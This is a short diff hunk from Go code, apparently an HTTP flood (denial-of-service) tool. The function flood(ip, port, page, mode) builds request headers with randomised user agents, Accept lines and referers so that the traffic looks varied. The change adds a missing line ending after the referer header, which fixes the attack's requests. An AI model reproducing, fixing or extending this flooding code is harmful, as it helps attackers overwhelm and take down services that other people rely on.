@@ -128,7 +128,7 @@ func flood(ip, port, page, mode string) {
 			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
 			header += "User-Agent: " + getuseragent() + "\r\n"
 			header += acceptall[rand.Intn(len(acceptall))]
-			header += referers[rand.Intn(len(referers))]
+			header += referers[rand.Intn(len(referers))] + "\r\n"
 		} else {
 			fi, err := os.Open(os.Args[7])
 			if err != nil {
